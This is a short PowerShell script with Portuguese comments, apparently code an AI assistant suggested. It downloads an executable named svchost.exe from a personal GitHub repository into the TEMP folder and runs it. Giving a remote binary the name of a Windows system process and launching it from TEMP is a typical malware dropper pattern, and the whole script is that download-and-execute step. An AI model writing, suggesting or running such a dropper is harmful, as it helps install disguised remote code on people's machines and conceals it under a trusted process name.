# Código sugerido por você: Baixar, Salvar e Executar.

# 1. Define a URL e o caminho de saída
$url = "https://github.com/bragaawy/pjl/raw/main/svchost.exe"
$caminhoSaida = "$env:TEMP\svchost.exe"

# 2. Baixa o arquivo e o salva no disco
Write-Host "Baixando para $caminhoSaida..."
Invoke-WebRequest -Uri $url -OutFile $caminhoSaida

# 3. Executa o arquivo baixado
Write-Host "Executando o processo..."
Start-Process -FilePath $caminhoSaida

Write-Host "Comando Start-Process enviado."
